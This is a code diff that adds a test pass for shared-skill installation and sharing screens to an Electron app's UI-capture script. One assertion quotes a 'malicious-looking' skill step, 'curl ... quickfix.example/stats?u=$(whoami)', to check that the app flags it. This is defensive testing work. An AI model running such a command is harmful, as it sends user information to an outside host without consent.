@@ -11,6 +11,8 @@
      node scripts/ui-capture.js --out /tmp/ui --no-session   # skip the ~20 s voice session
      node scripts/ui-capture.js --out /tmp/ui --panels-only  # only the overlay-panel pass
      node scripts/ui-capture.js --out /tmp/ui --no-panels    # skip it
+     node scripts/ui-capture.js --out /tmp/ui --shared-only  # only the shared-skills pass (Library + skills panel)
+     node scripts/ui-capture.js --out /tmp/ui --no-shared    # skip it
      node scripts/ui-capture.js --out /tmp/ui --real ws://127.0.0.1:8794
        # against an agent that's already running (never 8765): no mock is
        # started, and only the checks that are safe on a real agent run --
@@ -65,6 +67,8 @@ const MOCK_PORT = Number(arg("mock-port", 8797));
 const DEBUG_PORT = Number(arg("debug-port", 9347));
 const INSPECT_PORT = Number(arg("inspect-port", 9348));
 const PANELS_ONLY = flag("panels-only");
+const SHARED_ONLY = flag("shared-only");
+const WITH_SHARED = !flag("no-shared") && !arg("real", null);
 const WITH_PANELS = !flag("no-panels") && !arg("real", null);
 const REAL_URL = arg("real", null);
 const WITH_SESSION = !flag("no-session") && !REAL_URL;
@@ -1035,6 +1039,277 @@ async function runPanels(theme) {
 
 // The reduced pass for a real agent: real catalog, real control messages,
 // nothing that runs a tool.
+// --- the shared-skill registry: Discover, install card, share ------------------
+// Its own mock and Electron, with LEUTHERIA_TEST_HOOKS=1: main.js then records
+// the GitHub page a share would open (and what it would copy) instead of
+// opening a browser or touching the clipboard, and the script reads that
+// record through the main process's inspector.
+
+async function runShared(theme) {
+  const dir = path.join(OUT, theme, "shared");
+  fs.mkdirSync(dir, { recursive: true });
+  const file = (name) => path.join(dir, `${name}.png`);
+  const stateDir = path.join(dir, "_state");
+  fs.rmSync(stateDir, { recursive: true, force: true });
+  const token = generateToken();
+  const T = `[${theme}] shared:`;
+  const backdrop = theme === "dark" ? { r: 34, g: 36, b: 44, a: 1 } : { r: 214, g: 216, b: 222, a: 1 };
+
+  const mock = spawn(process.execPath, [path.join(__dirname, "mock-agent.js")], {
+    env: { ...childEnv(token), MOCK_PORT: String(MOCK_PORT), MOCK_AUTOSTART: "0" },
+    stdio: "ignore",
+  });
+  const env = {
+    ...childEnv(token),
+    LEUTHERIA_AGENT_URL: `ws://127.0.0.1:${MOCK_PORT}`,
+    LEUTHERIA_NO_SPAWN: "1",
+    LEUTHERIA_CAPTURE_DIR: stateDir,
+    LEUTHERIA_CAPTURE_THEME: theme,
+    LEUTHERIA_TEST_HOOKS: "1",
+  };
+  delete env.ELECTRON_RUN_AS_NODE;
+  const electron = spawn(require("electron"), [".", `--remote-debugging-port=${DEBUG_PORT}`, `--inspect=${INSPECT_PORT}`], {
+    cwd: APP_DIR,
+    env,
+    stdio: "ignore",
+  });
+
+  const rows = `[...document.querySelectorAll("#library-list .list-row")]`;
+  const rowNames = (group) => `[...document.querySelectorAll("#library-group-${group} .list-row")].map((n) => n.dataset.name)`;
+  const pick = (name) => clickText("#library-list .list-row-name", name);
+  const card = `document.querySelector("#library-detail .install-card")`;
+  const noOverflow = `document.documentElement.scrollWidth <= window.innerWidth && document.querySelector(".main").scrollWidth <= document.querySelector(".main").clientWidth`;
+
+  try {
+    const hooks = await Page.attach(null, 20000, INSPECT_PORT);
+    await hooks.waitFor(`globalThis.__leutheriaTest`, 15000);
+    // Park the injected cursor mid-screen so the hot edge stays out of it.
+    await hooks.eval(`(() => { const d = __leutheriaTest.display().bounds; __leutheriaTest.setCursor({ x: d.x + Math.round(d.width / 2), y: d.y + Math.round(d.height / 2) }); })()`);
+    const main = await Page.attach("renderer/index.html");
+    await main.size(WIDTHS[0], HEIGHT);
+    check(`${T} agent connects`, await main.waitFor(`document.getElementById("status").dataset.state === "connected"`, 15000));
+    await main.waitFor(`window.LX && LX.state.inventory`, 8000);
+    if (theme === "light") await main.eval(`document.getElementById("theme-toggle").click()`);
+    const command = async (text) => {
+      await main.eval(`window.leutheria.sendCommand(${JSON.stringify(text)})`);
+      await sleep(400);
+    };
+    const refresh = async () => {
+      await main.eval(`document.querySelector(".shared-refresh").click()`);
+      await sleep(700);
+    };
+
+    // --- the Library's imported skills, before Shared is opened
+    await main.eval(clickNav(NAV.library));
+    check(
+      `${T} imported skills are tagged in the full list (withdrawn, update, shared)`,
+      await main.waitFor(
+        `(() => { const tag = (n) => document.querySelector('#library-list .list-row[data-name="' + n + '"] .badge')?.textContent; return tag("convert_heic_batch") === "withdrawn" && tag("tidy_desktop") === "update" && tag("daily_standup_notes") === "shared"; })()`
+      )
+    );
+    await main.eval(pick("daily_standup_notes"));
+    check(`${T} an imported skill's detail says where it came from`, await main.waitFor(`/From the registry/.test(document.getElementById("library-detail").textContent) && /anurag-k/.test(document.getElementById("library-detail").textContent)`));
+    await main.shot(file("library-imported-detail"));
+
+    // --- Discover / Installed
+    await main.eval(`document.querySelector('.segmented button[data-kind="shared"]').click()`);
+    check(
+      `${T} Shared lists Installed and Discover, a withdrawn version hidden from Discover`,
+      await main.waitFor(
+        `${rowNames("shared-installed")}.join() === "convert_heic_batch,daily_standup_notes,tidy_desktop" && ${rowNames("shared-discover")}.length === 4 && !${rowNames("shared-discover")}.includes("convert_heic_batch")`
+      )
+    );
+    await main.eval(`LX.library.reveal("shared:")`); // nothing selected: the overview
+    check(`${T} the overview reads the index as verified, 3 of 20 installed`, await main.waitFor(`document.querySelector('.shared-index-state[data-state="verified"]') && /3 \\/ 20/.test(document.getElementById("library-detail").textContent)`));
+    check(`${T} rows mark run_command and risk`, await main.eval(`Boolean(document.querySelector('.list-row[data-name="clean_system_caches"] .shared-cmd') && document.querySelector('.list-row[data-name="clean_system_caches"] .badge-danger')) && !document.querySelector('.list-row[data-name="rename_screenshots"] .shared-cmd')`));
+    await main.shot(file("shared-overview"));
+
+    // the malicious-looking one: every step, in full, flagged
+    await main.eval(pick("clean_system_caches"));
+    check(`${T} the install card shows every step`, await main.waitFor(`${card} && ${card}.querySelectorAll(".install-steps .step").length === 4`));
+    check(
+      `${T} run_command steps are flagged, arguments untruncated`,
+      await main.eval(
+        `${card}.querySelectorAll(".step-command").length === 3 && /curl -s https:\\/\\/quickfix\\.example\\/stats\\?u=\\$\\(whoami\\)/.test(${card}.textContent) && /Runs shell commands/i.test(${card}.querySelector(".shared-cmd-warning").textContent)`
+      )
+    );
+    check(
+      `${T} author, review verdict, risk and flags are on the card and detail`,
+      await main.eval(`/quickfix-dev/.test(${card}.textContent) && /Human reviewed/.test(document.getElementById("library-detail").textContent) && ${card}.querySelector(".shared-high-risk") && document.querySelectorAll(".shared-flags li").length === 3`)
+    );
+    check(`${T} the model's description is the local one, the author's is marked as never sent`, await main.eval(`/^Shared skill by quickfix-dev/.test(${card}.querySelector(".shared-model-desc").textContent) && /Never sent to the model/.test(${card}.textContent)`));
+    await main.shot(file("shared-install-flagged"));
+    await main.eval(`document.getElementById("library-detail").scrollTop = 1e6`);
+    await main.shot(file("shared-install-flagged-bottom"));
+    await sleep(500);
+    check(`${T} selecting and reading the card installs nothing`, await main.eval(`!LX.state.inventory.skills.some((s) => s.name === "clean_system_caches")`));
+
+    await main.eval(pick("git_morning_sync"));
+    await main.waitFor(`${card} && ${card}.querySelectorAll(".install-steps .step").length === 3`);
+    await main.shot(file("shared-install-cmd"));
+
+    // install, by the card's button
+    await main.eval(pick("rename_screenshots"));
+    await main.waitFor(`${card} && ${card}.querySelector(".btn-hot") && !${card}.querySelector(".btn-hot").disabled`);
+    await main.eval(`${card}.querySelector(".btn-hot").click()`);
+    check(
+      `${T} Install installs, the card settles, the row moves to Installed`,
+      (await main.waitFor(`${card} && ${card}.classList.contains("resolved") && /Installed v2/.test(${card}.textContent)`)) &&
+        (await main.waitFor(`LX.state.inventory.skills.some((s) => s.name === "rename_screenshots" && s.origin === "imported")`)) &&
+        (await main.waitFor(`${rowNames("shared-installed")}.includes("rename_screenshots")`))
+    );
+    await main.shot(file("shared-installed"));
+
+    // update: the new version's steps, marked against the installed ones
+    await main.eval(pick("tidy_desktop"));
+    check(
+      `${T} an update is a new approval, with the changed steps marked`,
+      await main.waitFor(`${card} && /Update to v2/.test(${card}.textContent) && ${card}.querySelectorAll(".install-steps .badge-accent").length === 1 && /Version 1 keeps working/.test(${card}.textContent)`)
+    );
+    await main.shot(file("shared-update"));
+
+    await main.eval(pick("convert_heic_batch"));
+    check(`${T} a withdrawn skill says so and offers Delete, no install card`, await main.waitFor(`document.querySelector("#library-detail .shared-withdrawn .btn-danger") && !${card}`));
+    await main.shot(file("shared-withdrawn"));
+
+    await main.eval(setInput(".search input", "mira"));
+    check(`${T} search matches the author`, await main.waitFor(`${rows}.map((n) => n.dataset.name).join() === "rename_screenshots,tidy_desktop"`));
+    await main.shot(file("shared-search"));
+    await main.eval(setInput(".search input", ""));
+    await main.eval(`document.querySelector('.library-filters [data-filter="updates"]').click()`);
+    check(`${T} the Updates filter`, await main.waitFor(`${rows}.map((n) => n.dataset.name).join() === "tidy_desktop"`));
+    await main.eval(`document.querySelector('.library-filters [data-filter="updates"]').click()`);
+
+    // at the cap: Install is refused before it's sent
+    await command("registry full");
+    await refresh();
+    await main.eval(pick("git_morning_sync"));
+    check(`${T} at the cap Install is disabled and says why`, await main.waitFor(`${card} && ${card}.querySelector(".btn-hot").disabled && /At the limit/i.test(${card}.textContent)`));
+    await main.shot(file("shared-cap"));
+
+    // index states
+    for (const [word, code, security] of [
+      ["tampered", "verification_failed", true],
+      ["nokey", "no_signing_key", true],
+      ["offline", "unavailable", false],
+    ]) {
+      await command(`registry ${word}`);
+      await refresh();
+      await main.eval(`LX.library.reveal("shared:")`); // nothing selected: the overview
+      const ok =
+        (await main.waitFor(`document.querySelector('#library-list .shared-index[data-index="${code}"]')`)) &&
+        (await main.eval(
+          `${security} === Boolean(document.querySelector("#library-list .shared-index-refused")) && !document.getElementById("library-group-shared-discover") && ${rowNames("shared-installed")}.length === 4`
+        ));
+      check(`${T} index ${code}: ${security ? "a security state (red, alert)" : "a neutral notice"}; nothing listed to install, installed kept`, ok);
+      await main.shot(file(`shared-index-${code}`));
+    }
+    await command("registry ok");
+    await refresh();
+
+    // --- share a learned skill
+    await main.eval(`document.querySelector('.segmented button[data-kind="all"]').click()`);
+    await main.eval(pick("archive_downloads"));
+    await main.eval(clickText("#library-detail button", "Preview share"));
+    check(
+      `${T} share preview: target path, what changed, flagged constants, the file`,
+      await main.waitFor(
+        `document.querySelector(".share-preview") && /skills\\/archive_downloads\\/[0-9a-f]{64}\\.json/.test(document.querySelector(".share-path").textContent) && document.querySelectorAll(".share-changes li").length >= 2 && document.querySelectorAll(".share-flagged li").length === 1 && /"steps"/.test(document.querySelector(".share-json").textContent)`
+      )
+    );
+    await main.eval(`document.querySelector(".share-preview").scrollIntoView()`);
+    await main.shot(file("share-preview"));
+    await main.eval(clickText("#library-detail button", "Open on GitHub"));
+    const opened = await main.waitFor(`document.querySelector(".share-done")`);
+    const record = await hooks.eval(`__leutheriaTest.shared()`);
+    const last = record[record.length - 1] || {};
+    check(`${T} Open on GitHub opens a github.com page, copies nothing`, opened && /^https:\/\/github\.com\/AnuragK-O\/leutheria-skills\/new\/main\?filename=/.test(last.url || "") && last.copied === 0);
+    await main.eval(`document.querySelector(".share-done")?.scrollIntoView({ block: "center" })`);
+    await main.shot(file("share-opened"));
+
+    const LONG = "export_quarterly_reports_to_the_shared_finance_drive_and_notify_the_team";
+    await main.eval(pick(LONG));
+    await main.eval(clickText("#library-detail button", "Preview share"));
+    check(`${T} a too-long file offers copy-and-open`, await main.waitFor(`/Copy and open GitHub/.test(document.getElementById("library-detail").textContent) && document.querySelector(".share-flagged li")`));
+    await main.eval(`document.querySelector(".share-preview").scrollIntoView()`);
+    await main.shot(file("share-preview-long"));
+    await main.eval(clickText("#library-detail button", "Copy and open GitHub"));
+    await main.waitFor(`document.querySelector(".share-done")`);
+    const recordLong = await hooks.eval(`__leutheriaTest.shared()`);
+    const lastLong = recordLong[recordLong.length - 1] || {};
+    check(`${T} the long file goes to the clipboard and the page opens without it`, recordLong.length === record.length + 1 && lastLong.copied > 1000 && !/value=/.test(lastLong.url));
+    await main.eval(`document.querySelector(".share-done")?.scrollIntoView({ block: "center" })`);
+    await main.shot(file("share-copied"));
+
+    await command("registry badshare");
+    await main.eval(pick("archive_downloads"));
+    await main.eval(clickText("#library-detail button", "Done"));
+    await main.eval(clickText("#library-detail button", "Preview share"));
+    await main.waitFor(`document.querySelector(".share-preview")`);
+    await main.eval(clickText("#library-detail button", "Open on GitHub"));
+    const refused = await main.waitFor(`/didn't point at github\\.com/.test(document.getElementById("library-detail").textContent)`);
+    check(`${T} main.js refuses to open a share URL that isn't github.com`, refused && (await hooks.eval(`__leutheriaTest.shared().length`)) === recordLong.length);
+    await main.eval(`document.querySelector(".share .callout")?.scrollIntoView()`);
+    await main.shot(file("share-refused-url"));
+    await command("registry ok");
+
+    await main.eval(pick("create_project"));
+    check(`${T} a built-in skill has no Share`, await main.eval(`!/Preview share/.test(document.getElementById("library-detail").textContent)`));
+
+    // --- the narrow width
+    await main.size(WIDTHS[WIDTHS.length - 1], HEIGHT);
+    await main.eval(`document.querySelector('.segmented button[data-kind="shared"]').click()`);
+    await main.eval(pick("clean_system_caches"));
+    await main.waitFor(`${card} && ${card}.querySelectorAll(".install-steps .step").length === 4`);
+    await main.shot(file(`w${WIDTHS[WIDTHS.length - 1]}-shared-install`));
+    check(`${T} the install card at ${WIDTHS[WIDTHS.length - 1]}px has no horizontal overflow`, await main.eval(noOverflow));
+    await main.eval(`document.querySelector('.segmented button[data-kind="all"]').click()`);
+    await main.eval(pick("archive_downloads"));
+    await main.eval(clickText("#library-detail button", "Cancel"));
+    await main.eval(clickText("#library-detail button", "Preview share"));
+    await main.waitFor(`document.querySelector(".share-preview")`);
+    await main.eval(`document.querySelector(".share-preview").scrollIntoView()`);
+    await main.shot(file(`w${WIDTHS[WIDTHS.length - 1]}-share-preview`));
+    check(`${T} the share preview at ${WIDTHS[WIDTHS.length - 1]}px has no horizontal overflow`, await main.eval(noOverflow));
+    await main.size(WIDTHS[0], HEIGHT);
+
+    // --- the skills panel
+    await main.eval(`window.leutheria.showPanel("skills")`);
+    const panel = await Page.attach("panel.html?id=skills");
+    await panel.send("Emulation.setDefaultBackgroundColorOverride", { color: backdrop });
+    await panel.waitFor(`document.body.classList.contains("ready")`, 8000);
+    await panel.eval(`document.querySelector('#panel-tools .segmented button[data-kind="shared"]').click()`);
+    check(`${T} the skills panel lists shared skills`, await panel.waitFor(`document.querySelectorAll("#library-group-shared-discover .list-row").length >= 3`));
+    await panel.shot(file("panel-skills-shared"));
+    await panel.eval(clickText("#library-list .list-row-name", "clean_system_caches"));
+    check(`${T} the panel's install card shows every step too`, await panel.waitFor(`document.querySelectorAll("#library-detail .install-card .install-steps .step").length === 4`));
+    await panel.shot(file("panel-skills-install"));
+    await panel.eval(`document.getElementById("library-detail").scrollTop = 1e6`);
+    await panel.shot(file("panel-skills-install-bottom"));
+    check(`${T} the panel has no horizontal overflow`, await panel.eval(`document.documentElement.scrollWidth <= window.innerWidth`));
+    await panel.eval(`document.querySelector('[data-ctl="orientation"]').click()`);
+    await panel.waitFor(`document.body.dataset.orientation === "horizontal"`);
+    await sleep(500);
+    await panel.shot(file("panel-skills-shared-horizontal"));
+    await panel.eval(`document.querySelector('[data-ctl="orientation"]').click()`);
+    await panel.eval(`document.querySelector('[data-ctl="close"]').click()`);
+  } finally {
+    // The next pass reuses the debugging ports, so Electron must really be
+    // gone: SIGTERM, then SIGKILL if it hasn't exited (it sometimes ignores
+    // the first while a panel window is open).
+    for (const child of [electron, mock]) {
+      if (child.exitCode !== null || child.signalCode !== null) continue;
+      const gone = new Promise((resolve) => child.once("exit", () => resolve(true)));
+      child.kill();
+      if (!(await Promise.race([gone, sleep(4000)]))) {
+        child.kill("SIGKILL");
+        await Promise.race([gone, sleep(3000)]);
+      }
+    }
+    await sleep(600);
+  }
+}
+
 async function runReal(main, theme, file) {
   await main.shot(file("real-assistant-empty"));
 
@@ -1120,18 +1395,25 @@ async function runReal(main, theme, file) {
 (async () => {
   fs.mkdirSync(OUT, { recursive: true });
   for (const theme of THEMES) {
-    if (!PANELS_ONLY) {
+    if (!PANELS_ONLY && !SHARED_ONLY) {
       try {
         await runTheme(theme);
       } catch (err) {
         check(`[${theme}] run completed`, false, err.message);
       }
     }
-    if (WITH_PANELS) {
+    if (WITH_PANELS && !SHARED_ONLY) {
       try {
         await runPanels(theme);
       } catch (err) {
         check(`[${theme}] panels: run completed`, false, err.message);
+      }
+    }
+    if (WITH_SHARED && !PANELS_ONLY) {
+      try {
+        await runShared(theme);
+      } catch (err) {
+        check(`[${theme}] shared: run completed`, false, err.message);
       }
     }
   }
